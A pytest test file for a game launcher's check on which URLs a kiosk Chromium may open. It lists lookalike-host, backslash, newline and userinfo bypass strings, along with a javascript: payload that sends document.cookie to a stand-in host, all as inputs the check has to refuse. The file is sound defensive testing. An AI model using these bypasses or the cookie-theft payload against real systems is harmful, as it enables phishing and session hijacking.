# Shelfcloud project - https://shelfcloud.cc - bart@schelstraete.org
"""Where a Steam shortcut is allowed to send the browser.

A launch opens a kiosk Chromium with live provider sessions and no address bar,
so "which URL" is a security question. The URL comes from the gateway or an
old on-disk shortcut, neither trusted, so the check lives here on the device.
"""

import os
import sys
import types
from unittest import mock

import pytest

# cdp is only needed for the autoplay click; stub it to keep this a unit test
sys.modules.setdefault("cdp", types.ModuleType("cdp"))

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.join(ROOT, "bin"))
sys.path.insert(0, os.path.join(ROOT, "py_modules"))

import importlib.util  # noqa: E402

spec = importlib.util.spec_from_file_location(
    "shelfcloud_launch", os.path.join(ROOT, "bin", "shelfcloud-launch.py"))
launcher = importlib.util.module_from_spec(spec)
spec.loader.exec_module(launcher)

allowed = launcher.is_allowed_launch_url


# the real provider URLs, shapes taken from the production catalog

@pytest.mark.parametrize("url", [
    "https://play.geforcenow.com/games?game-id=abc-123&lang=en_US",
    "https://cloud.boosteroid.com/application/682",
    "https://www.xbox.com/play/games/forza-horizon-5/9NKX70BBCDRN",
    "https://luna.amazon.com/game/alan-wake-2/B0GFWDM8NP?autoplay=1",
    "https://luna.amazon.com/game/fortnite?autoplay=1",   # the one ASIN-less title
    "https://cloud.boosteroid.com/",          # the setup URLs the launcher uses
    "https://play.geforcenow.com/",
    "https://www.xbox.com/play",
    "https://luna.amazon.com/",
])
def test_the_providers_are_allowed(url):
    assert allowed(url) is True


# Luna is pinned to a full host, not a registrable domain: "amazon.com" as a
# suffix rule would admit everything Amazon serves.

@pytest.mark.parametrize("hostile", [
    "https://www.amazon.com/dp/B0GFWDM8NP",        # retail
    "https://amazon.com/",
    "https://sellercentral.amazon.com/",
    "https://s3.amazonaws.com/bucket/page.html",
    "https://luna.amazon.com.evil.com/game/x",     # suffix lookalike
    "https://notluna.amazon.com/game/x",
    "https://luna.amazon.de/game/x",               # real Luna, but not our host
])
def test_only_the_luna_host_is_allowed_not_amazon_at_large(hostile):
    """Widening this to "amazon.com" would pass every one of these. luna.amazon.de
    is refused too and costs nothing: the catalog stores .com links that
    redirect each user to their own country anyway."""
    assert allowed(hostile) is False, hostile


# our own website tile: its URL runs the same check, and the gateway host was
# once missing from the list, so the launcher refused his own website.

def test_the_website_tile_can_actually_launch():
    assert allowed(launcher.GATEWAY) is True
    assert allowed(launcher.GATEWAY + "/games") is True


def test_the_gateway_entry_is_derived_from_the_gateway_constant():
    """Typed twice they drift, and the website tile breaks when GATEWAY moves."""
    import urllib.parse
    host = urllib.parse.urlsplit(launcher.GATEWAY).hostname
    assert host in launcher.ALLOWED_LAUNCH_DOMAINS


def test_the_old_plaintext_lan_gateway_is_still_refused():
    """Old shortcuts still carry http://192.168.x.x:8000. Admitting our own
    host must not admit that: http, on a LAN address that may now be someone
    else's."""
    assert allowed("http://192.168.129.164:8000") is False
    assert allowed("http://shelfcloud.cc/") is False


def test_a_lookalike_of_our_own_host_is_refused():
    for hostile in ("https://shelfcloud.cc.evil.com/",
                    "https://notshelfcloud.cc/",
                    "https://shelfcloud.cc@evil.example/"):
        assert allowed(hostile) is False, hostile


def test_the_luna_launch_url_the_catalog_actually_builds_is_allowed():
    """Guards the contract with the gateway's amazon_luna.py: if either side
    changes host or scheme, every Luna tile stops launching."""
    built = "https://luna.amazon.com/game/{slug}/{asin}?autoplay=1".format(
        slug="alien-isolation", asin="B09HFKWMTQ")
    assert allowed(built) is True


def test_a_subdomain_of_a_provider_is_allowed():
    """Providers move things between subdomains, so the registerable domain is
    what we trust."""
    assert allowed("https://eu-west.play.geforcenow.com/games?game-id=1") is True


# ------------------------------------------------------- what must be refused

def test_plain_http_is_refused():
    """A launch carries session cookies, readable over http by anything on the
    path."""
    assert allowed("http://play.geforcenow.com/games?game-id=1") is False


def test_an_unrelated_site_is_refused():
    assert allowed("https://evil.example/phish") is False


def test_a_suffix_lookalike_is_refused():
    """"xbox.com.evil.com" ends with "xbox.com". Without requiring the dot that
    starts the label, one registered domain bypasses the whole list."""
    for hostile in ("https://xbox.com.evil.com/play",
                    "https://play.geforcenow.com.evil.com/games",
                    "https://notxbox.com/play",
                    "https://myboosteroid.com/application/1"):
        assert allowed(hostile) is False, hostile


@pytest.mark.parametrize("hostile", [
    "https://evil.com\\cloud.boosteroid.com/steal",
    "https://evil.com\\www.xbox.com/",
    "https://evil.com\\play.geforcenow.com/games",
    "https://evil.com\\\\www.xbox.com/",
    "https://evil.com/\\www.xbox.com/",
    "https://www.xbox.com\\@evil.com/",
])
def test_a_backslash_is_refused_because_the_browser_reads_it_as_a_slash(hostile):
    """A parser differential. urlsplit (RFC 3986) reads "\\" as ordinary, so the
    host ends with ".boosteroid.com" and passes; Chromium (WHATWG) reads "\\"
    like "/", so the same string opens evil.com. The browser is what matters.
    """
    assert allowed(hostile) is False


@pytest.mark.parametrize("hostile", [
    "https://evil.com\t.boosteroid.com/",
    "https://evil.com\n.xbox.com/",
    "https://evil.com\r.xbox.com/",
    "https://www.xbox.com\n",
])
def test_tabs_and_newlines_are_refused(hostile):
    """Browsers strip these before resolving, which can move the host boundary
    after this function approved the string."""
    assert allowed(hostile) is False


def test_the_raw_string_is_checked_before_it_is_stripped():
    """A trailing newline is part of the attack, so .strip() must not eat it
    before the check sees it."""
    assert allowed("https://evil.com\\www.xbox.com/\n") is False


def test_credentials_in_the_authority_are_refused():
    """"https://play.geforcenow.com@evil.com/" has host evil.com: reads as the
    provider, resolves elsewhere -- a phishing link."""
    for hostile in ("https://play.geforcenow.com@evil.com/",
                    "https://www.xbox.com:pass@evil.com/play"):
        assert allowed(hostile) is False, hostile


def test_non_web_schemes_are_refused():
    """A Chromium command line accepts more than web pages -- file:// reads
    local files -- which a game launcher has no business opening."""
    for hostile in ("file:///etc/passwd",
                    "file:///home/deck/homebrew/settings/Shelfcloud/settings.json",
                    "javascript:fetch('//evil/?c='+document.cookie)",
                    "data:text/html,<script>alert(1)</script>",
                    "chrome://settings",
                    "ftp://play.geforcenow.com/x"):
        assert allowed(hostile) is False, hostile


def test_junk_is_refused_rather_than_raising():
    """Runs at launch, so a exception is a game that will not start."""
    for junk in (None, "", "   ", 42, [], {}, b"https://www.xbox.com/play",
                 "not a url", "https://", "https:///play", "://xbox.com"):
        assert allowed(junk) is False, repr(junk)


def test_a_trailing_dot_host_does_not_slip_past():
    """"www.xbox.com." is the same host to a resolver, so it is normalised, not
    compared raw -- the same trick on a lookalike must still fail."""
    assert allowed("https://www.xbox.com./play") is True
    assert allowed("https://www.xbox.com.evil.com./play") is False


def test_case_is_not_a_bypass():
    assert allowed("https://WWW.XBOX.COM/play") is True
    assert allowed("HTTPS://www.xbox.com/play") is True


# --------------------------------------------- the gateway is not trusted

def settings(tmp_path, **extra):
    """A settings.json on disk, as the launcher reads it."""
    import json
    path = tmp_path / "settings.json"
    payload = {"api_token": "t" * 43}
    payload.update(extra)
    path.write_text(json.dumps(payload))
    return str(path)


def test_a_hostile_url_from_the_gateway_falls_back_instead_of_opening(tmp_path):
    """A compromised gateway is the threat: its answer is refused and the
    stored good link used."""
    good = "https://cloud.boosteroid.com/application/682"
    with mock.patch.object(launcher, "SETTINGS_FILE", settings(tmp_path)), \
         mock.patch.object(launcher, "urllib") as net:
        net.request.Request = mock.MagicMock()
        response = mock.MagicMock()
        response.__enter__ = lambda s: s
        response.__exit__ = lambda *a: False
        response.read.return_value = b'{"launch_url": "https://evil.example/phish"}'
        net.request.urlopen.return_value = response
        # the validator needs urlsplit, so keep the real parser
        net.parse = __import__("urllib.parse", fromlist=["parse"])

        url, source = launcher.resolve_launch("42", good)

    assert url == good
    assert "refused" in source


def test_the_gateway_address_is_the_constant_not_a_setting(tmp_path):
    """Old settings.json still carries a plaintext gateway_url. Reading it would
    send the token over the LAN in clear and take the URL from whoever answered.
    """
    seen = {}

    def capture(url, *a, **kw):
        seen["url"] = url
        raise OSError("stop here; the address is the assertion")

    with mock.patch.object(launcher, "SETTINGS_FILE",
                           settings(tmp_path, gateway_url="http://192.168.129.164:8000")), \
         mock.patch.object(launcher.urllib.request, "Request", side_effect=capture):
        launcher.resolve_launch("42", "https://www.xbox.com/play")

    assert seen["url"].startswith("https://")
    assert "192.168" not in seen["url"]
    assert seen["url"].startswith(launcher.GATEWAY)


def test_the_launcher_and_the_plugin_agree_on_the_gateway():
    """Two files, one address. A disagreement kept the plaintext path alive."""
    import re
    with open(os.path.join(ROOT, "main.py"), encoding="utf-8") as handle:
        match = re.search(r'^DEFAULT_GATEWAY\s*=\s*"([^"]+)"', handle.read(), re.M)
    assert match, "main.py no longer defines DEFAULT_GATEWAY"
    assert launcher.GATEWAY == match.group(1)


def test_the_gateway_is_reached_over_verified_tls():
    """The context must verify and check hostnames, or a man-in-the-middle
    suceeds silently."""
    import ssl
    ctx = launcher._ssl_context()
    assert ctx.verify_mode == ssl.CERT_REQUIRED
    assert ctx.check_hostname is True
